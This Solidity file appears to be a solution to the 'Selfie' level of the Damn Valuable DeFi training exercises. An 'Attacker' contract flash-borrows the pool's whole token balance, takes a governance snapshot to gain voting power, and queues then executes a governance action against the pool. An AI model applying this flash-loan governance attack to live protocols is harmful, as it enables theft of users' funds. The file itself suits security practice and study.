// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

import "hardhat/console.sol";

contract Attacker is IERC3156FlashBorrower {
    uint256 private _actionId;
    address private _owner;
    SelfiePool private _pool;
    SimpleGovernance private _governance;
    DamnValuableTokenSnapshot private _token;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address pool, address governance, address token) {
        _owner = msg.sender;
        _pool = SelfiePool(pool);
        _governance = SimpleGovernance(governance);
        _token = DamnValuableTokenSnapshot(token);
        // approve pool to transfer tokens
        _token.approve(address(_pool), type(uint256).max);
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        console.log("onFlashLoan", amount);
        // require(msg.sender == address(_pool), "only pool");
        require(token == address(_token), "only token");

        // 1. snapshot token balance
        _token.snapshot();

        // // 2. queueAction
        _governance.queueAction(address(_pool), 0, data);

        return CALLBACK_SUCCESS;
    }

    function executeAction() external {
        require(msg.sender == _owner, "only owner");

        // 1. flash loan from pool to get tokens as much as possible
        _governance.executeAction(_actionId);

        // 2. transfer tokens to owner
        // _token.transfer(_owner, _token.balanceOf(address(this)));
    }

    function attack(bytes calldata data) external {
        require(msg.sender == _owner, "only owner");

        // 1. flash loan from pool to get tokens as much as possible
        _pool.flashLoan(
            this,
            address(_token),
            _token.balanceOf(address(_pool)),
            data
        );
    }
}
